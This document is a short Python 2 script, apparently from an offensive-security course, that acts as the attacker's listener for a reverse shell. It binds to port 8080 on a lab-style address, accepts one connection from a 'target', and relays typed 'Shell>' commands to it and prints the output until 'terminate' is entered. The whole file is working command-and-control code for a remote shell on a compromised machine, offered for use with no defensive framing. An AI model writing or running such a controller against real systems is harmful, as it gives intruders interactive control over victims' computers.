import socket   # for building tcp connection


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start socket object
    s.bind(("10.0.2.15", 8080))  # define ip and listening port
    s.listen(1) # define backlog size, 1 since expecting single connection

    print '[+] Listening for incoming TCP connection on port 8080'

    conn, addr = s.accept()
    ''' return connection object ID (conn) and client (target) IP and source
        port in tuple (IP, port)
    '''
    while True:
        command = raw_input("Shell> ") # get user input, store in command var.
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print conn.recv(1024)

def main ():
    connect()

main()
